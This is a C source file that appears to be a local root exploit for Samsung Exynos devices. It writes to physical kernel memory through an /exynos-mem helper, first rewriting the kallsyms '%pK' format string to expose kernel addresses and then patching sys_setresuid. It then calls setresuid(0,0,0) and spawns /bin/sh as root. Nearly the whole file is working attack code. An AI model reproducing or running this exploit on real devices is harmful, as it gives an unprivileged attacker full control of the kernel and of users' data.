#define _GNU_SOURCE
#include <stdbool.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <stdlib.h>
#include <stdio.h>

// for i in $(seq 0 110; do echo "[OFFSET: $(($i * 0x10000000))" ; ./exynos-mem $((0x10000000 * $i)) 4096 0 | hexdump -C ; done
//#define PHYS_OFFSET 0x40000000
#define PHYS_OFFSET 0x60000000
//#define PAGE_OFFSET 0xC0000000
#define PAGE_OFFSET 0x80000000

int main(int argc, char **argv, char **env) { 
  	int fd, i, m, index, result;

	  unsigned long *paddr = NULL;
    unsigned long tmp = 0;
    unsigned long restore_ptr_fmt = 0;
    unsigned long restore_ptr_setresuid = 0;
    unsigned long addr_sym;

	int page_size = sysconf(_SC_PAGE_SIZE);
    int length = page_size * page_size;

    /* for root shell */
    char *cmd[2];
    cmd[0] = "/bin/sh";
    cmd[1] = NULL;

    /* /proc/kallsyms parsing */
    FILE *kallsyms = NULL;
    char line [512];
    char *ptr;
    char *str;

    bool found = false;

    char popen_cmd[256];
    FILE* pipe;

    /*
     * search the format string "%pK %c %s\n" in memory
     * and replace "%pK" by "%p" to force display kernel
     * symbols pointer
     */

  char buffer[13];
  for(int m = 0; m < length; m += 12) {

    snprintf(popen_cmd,256,"/exynos-mem %d %d %d", PHYS_OFFSET + 0x409e84 + m, 12, 0);

    if ((pipe = popen(popen_cmd, "r")) == NULL) {
      perror("popen");
      exit(1);
    }

    fread(buffer, 1, sizeof(buffer)-1, pipe);

    if (memcmp(buffer, "\x25\x70\x4b\x20\x25\x63\x20\x25\x73\x0a", 10) == 0) {
      tmp =  (unsigned long)(PHYS_OFFSET + m);
      restore_ptr_fmt = tmp + 0x409e84 + m + 2;
      printf("[*] s_show->seq_printf format string found at: 0x%08X\n", PHYS_OFFSET + m);

      snprintf(popen_cmd,256,"echo -e '\\x20' | /exynos-mem %d %d %d", PHYS_OFFSET + 0x409e84 + m + 2, 1, 1);

      if ((pipe = popen(popen_cmd, "r")) == NULL) {
        perror("popen");
        exit(1);
      }

      found = true;
      pclose(pipe);
      break;
    }
    pclose(pipe);
  }
  
  if (found == false) {
        printf("[!] s_show->seq_printf format string not found\n");
        exit(1);
  }

  /* kallsyms now display symbols address */       
  kallsyms = fopen("/proc/kallsyms", "r");
    if (kallsyms == NULL) {
        perror("fopen");
        exit(1);
  }

    found = false;

    /* parse /proc/kallsyms to find sys_setresuid address */
    while((ptr = fgets(line, 512, kallsyms))) {
        str = strtok(ptr, " ");
        addr_sym = strtoul(str, NULL, 16);
        index = 1;
        while(str) {
            str = strtok(NULL, " ");
            index++;
            if (index == 3) {
                if (strncmp("sys_setresuid\n", str, 14) == 0) {
                    printf("[*] sys_setresuid found at 0x%08X\n",(unsigned int)addr_sym);
                    found = true;
                }
                break;
            }
        }
        if (found) {
            tmp = PHYS_OFFSET;
            tmp += (addr_sym - PAGE_OFFSET);
            printf("tmp: 0x%08lX\n",tmp);
            for(m = 0; m < 128; m += 4) {

              snprintf(popen_cmd,256,"/exynos-mem %lu %d %d", tmp + m, 4, 0);

              if ((pipe = popen(popen_cmd, "r")) == NULL) {
                 perror("popen");
                 exit(1);
              }

              fread(buffer, 1, sizeof(buffer)-1, pipe);
              pclose(pipe);

              if (memcmp(buffer,"\x00\x00\x50\xe3",4) == 0) {
                    printf("[*] patching sys_setresuid at 0x%08lX (virtual)\n",addr_sym+m);
                    printf("[*] patching sys_setresuid at 0x%08lX (physical)\n",tmp+m);
                    
                    restore_ptr_setresuid = tmp + m;
                    snprintf(popen_cmd,256,"echo -e '\\x01' | /exynos-mem %lu %d %d", tmp + m , 1, 1);
                    if ((pipe = popen(popen_cmd, "r")) == NULL) {
                      perror("popen");
                      exit(1);
                    }
                    break;
                } 
            }
            break;
        }
    }

  fclose(kallsyms);

  // to be sure memory is updated
  usleep(100000);

  result = setresuid(0, 0, 0);
    if (result) {
       printf("[!] set user root failed");
       exit(1);
    }

  // Execute root shell
  execve(cmd[0], cmd, env);
  return 0;
}